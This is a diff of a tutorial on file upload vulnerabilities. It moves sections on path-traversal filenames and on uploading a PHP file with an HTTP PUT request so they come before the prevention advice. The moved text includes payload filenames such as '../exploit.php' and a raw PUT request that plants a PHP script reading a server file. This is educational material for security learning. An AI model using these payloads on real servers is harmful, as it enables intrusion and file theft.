@@ -131,6 +131,25 @@ Here, the attacker uploads a JSP file disguised with a `Content-Type` of `image/
 
 ---
 
+## **Uploading Files via Path Traversal Vulnerability**
+
+In some cases, you can exploit file upload vulnerability via path traversal:  
+- `filename="../exploit.php"`  
+- URL encoding: `filename="..%2fexploit.php"`
+
+---
+
+## **Uploading Files Using PUT**
+
+```text
+PUT /images/exploit.php HTTP/1.1
+Host: vulnerable-website.com
+Content-Type: application/x-httpd-php
+Content-Length: 49
+
+<?php echo file_get_contents('/path/to/file'); ?>
+```
+
 ## **Preventing File Upload Vulnerabilities**
 
 To mitigate file upload vulnerabilities:
@@ -210,21 +229,4 @@ Content-Type: application/x-httpd-php
 
 ---
 
-## **Uploading Files via Path Traversal Vulnerability**
 
-In some cases, you can exploit file upload vulnerability via path traversal:  
-- `filename="../exploit.php"`  
-- URL encoding: `filename="..%2fexploit.php"`
-
----
-
-## **Uploading Files Using PUT**
-
-```text
-PUT /images/exploit.php HTTP/1.1
-Host: vulnerable-website.com
-Content-Type: application/x-httpd-php
-Content-Length: 49
-
-<?php echo file_get_contents('/path/to/file'); ?>
-```
